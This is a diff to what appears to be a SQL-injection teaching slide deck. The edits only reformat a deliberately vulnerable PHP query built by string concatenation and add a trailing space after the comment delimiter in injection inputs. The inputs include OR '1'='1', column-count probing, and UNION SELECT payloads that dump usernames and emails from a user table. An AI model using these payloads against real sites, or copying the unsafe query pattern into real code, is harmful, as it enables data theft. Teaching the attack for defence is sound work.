@@ -33,7 +33,7 @@ SELECT user FROM zwitscher WHERE message = 'Things always end well.';
 ## Dynamic queries with PHP
 
 ```php
-$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';";
+$sql = "SELECT * FROM zwitscher WHERE hashtag = '" . $search . "';";
 $q = mysql_query($sql);
 ```
 
@@ -58,7 +58,7 @@ $q = mysql_query($sql);
 ## Query 1
 
 ```php
-$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';";
+$sql = "SELECT * FROM zwitscher WHERE hashtag = '" . $search . "';";
 ```
 
 <br />
@@ -77,7 +77,7 @@ $sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat';
 ## Query 2
 
 ```php
-$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';";
+$sql = "SELECT * FROM zwitscher WHERE hashtag = '" . $search . "';";
 ```
 
 <br />
@@ -96,7 +96,7 @@ $sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat' OR hashtag='#trivia';
 ## Query 3
 
 ```php
-$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';";
+$sql = "SELECT * FROM zwitscher WHERE hashtag = '" . $search . "';";
 ```
 
 <br />
@@ -151,7 +151,7 @@ $sql = "SELECT * FROM zwitscher WHERE hashtag = '#dog' OR '1'='1';
 ## First try
 
 ```php
-$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';";
+$sql = "SELECT * FROM zwitscher WHERE hashtag = '" . $search . "';";
 ```
 ---
 Input: <span style="color:crimson">#dog' UNION SELECT *  FROM user</span>
@@ -177,7 +177,7 @@ Task: Get rid of interfering characters by commenting them out
 
 ## Second try
 
-Input: <span style="color:crimson">#dog' UNION SELECT *  FROM user; --</span>
+Input: <span style="color:crimson">#dog' UNION SELECT *  FROM user; -- </span>
 
 ( **Important:** Space after delimiter )
 
@@ -222,7 +222,7 @@ $sql = "SELECT *
 
 ## What now? Brutforce!
 
-Input: <span style="color:crimson">#dog' UNION SELECT 1; --</span>
+Input: <span style="color:crimson">#dog' UNION SELECT 1; -- </span>
 
 ```php
 $sql = "SELECT *
@@ -238,7 +238,7 @@ $sql = "SELECT *
 
 ## What now? Brutforce!
 
-Input: <span style="color:crimson">#dog' UNION SELECT 1, 2; --</span>
+Input: <span style="color:crimson">#dog' UNION SELECT 1, 2; -- </span>
 
 ```php
 $sql = "SELECT * 
@@ -254,7 +254,7 @@ $sql = "SELECT *
 
 ## What now? Brutforce!
 
-Input: <span style="color:crimson">#dog' UNION SELECT 1, 2, 3; --</span>
+Input: <span style="color:crimson">#dog' UNION SELECT 1, 2, 3; -- </span>
 
 ```php
 $sql = "SELECT *
@@ -276,7 +276,7 @@ $sql = "SELECT *
 <br />
 <br />
 
-Input: <span style="color:crimson">#dog' UNION SELECT username, mail, age FROM user; --</span>
+Input: <span style="color:crimson">#dog' UNION SELECT username, mail, age FROM user; -- </span>
 
 ```php
 $sql = "SELECT *
